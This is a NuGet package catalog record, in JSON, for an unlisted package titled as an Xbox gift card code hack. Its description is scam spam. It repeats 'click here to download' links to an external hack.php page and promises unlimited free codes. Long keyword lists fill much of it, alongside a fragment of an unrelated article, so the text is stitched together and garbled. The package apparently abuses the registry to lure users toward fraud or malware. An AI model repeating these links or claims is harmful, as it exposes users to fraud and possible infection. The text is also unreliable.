{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.12.56/_xbox-gift-card-code-hack-working-2022-version-uam.8.7.83.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "a292daec-9a53-482a-ac45-c68b3116aae4",
  "catalog:commitTimeStamp": "2022-01-29T00:12:56.6333765Z",
  "created": "2022-01-26T16:18:41.007Z",
  "description": "# _Xbox Gift Card Code hack Working 2022 Version uam\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\n\nThe cards themselves, of course, are worthless, but each 5x5 code corresponds to a dollar amount. In this case the code, DD9J9-MXXXC-3Y6XD-3QH2C. Xbox Live Free Gift Card Code Generator | (% Working) Using our Xbox Live Gift Card Code. Generator Tool you can Get unlimited Free. ~{AG4-U8}~[Free Xbox Gift Card Generator 1. ] ~ {FREE Xbox Live. Codes} Unused Xbox Gift Card Codes. *October 27,* Online User free xbox gift.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\nFree xbox gift card codes hack 😇 Free xbox gift card digital code 👈 👉how to get xbox gift card codesLink In Frist CommentGet Free X Box Codes Free Xbox gi. Xbox one gift card codes hack. >>>>> Download Hack Tool hereXbox Codes Generator - Get Free Xbox Gift Card Codes Redeem free xbox one v bucks codes free xbox live gold codes at download Xbox Redeem Code Free at Generator Online Hack xbox gift card code generator no survey,,free xbox gift card code generator no human verification .  · How to get free Xbox gift card codes? So how to get a free Xbox gift card code in a legit way? In this post, we’ll show you effective and easy ways to earn an Xbox gift card. Method 1: Take advantage of Microsoft Rewards. Microsoft Rewards is the easiest way to get a free Xbox gift card. You don’t have to do this on your phone, or downloadted Reading Time: 4 mins.\n\nxbox gift card code generator, xbox gift card code generator no survey or human verification, xbox gift card code generator no survey, xbox gift card code generator free, xbox gift card code generator 2020, xbox gift card code generator no human verification, xbox gift card code generator no verification, xbox gift card code generator download, xbox gift card codes hack, xbox gift card hack, xbox gift card code digital, hack xbox gift card codes, codes to xbox gift cards, xbox digital gift card code generator, xbox gift card codes generator 2020 free, xbox gift card codes generator 2021 free, free xbox gift card code generator no human verification, free xbox gift card code generator no survey, free xbox gift card code generator no human verification 2019, how to get a free xbox code, xbox gift card codes generator 2020 no human verification, xbox gift card codes generator 2021 no human verification, how to get free roblox gift cards no human verification, xbox gift card codes list generator, xbox live gift card code generator, how to find xbox gift card code, how to get code for xbox gift card, where is the code on an xbox gift card, xbox gift card code generator no survey 2020, xbox one gift card code generator, xbox one gift card codes generator 2020, random xbox gift card code generator, xbox gift card redeem code generator, real xbox gift card codes generator, xbox gift card codes not used generator, xbox gift card codes reddit, how to get free gift cards on xbox one, how to redeem xbox gift card without code, $100 xbox gift card code generator, are there $10 xbox gift cards, xbox 1 gift card codes generator, free xbox one gift card code generator no survey, free xbox one gift card code generator, what is a gift card generator, xbox gift card code generator 2021, xbox gift card codes generator 2019, xbox gift card codes generator 2022, xbox 360 gift card code generator, $50 xbox gift card code generator, 8 dollar xbox gift card",
  "id": "_Xbox-Gift-Card-Code-hack-Working-2022-Version-uam",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:48:00.26Z",
  "listed": false,
  "packageHash": "+sXc/E6AFrEZP9DXgsEg+nEomv9+jvmRpY5zQB0kGqa/Uj5FZZywQsESOwCR9m67F9MLmoMIDxjWVuIJDp3obA==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11392,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Xbox-Gift-Card-Code-hack-Working-2022-Version-uam",
  "verbatimVersion": "8.7.83",
  "version": "8.7.83",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.12.56/_xbox-gift-card-code-hack-working-2022-version-uam.8.7.83.json#tngydfhxse.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1265,
      "fullName": "tngydfhxse.nuspec",
      "length": 4027,
      "name": "tngydfhxse.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.12.56/_xbox-gift-card-code-hack-working-2022-version-uam.8.7.83.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9467,
      "fullName": ".signature.p7s",
      "length": 9467,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}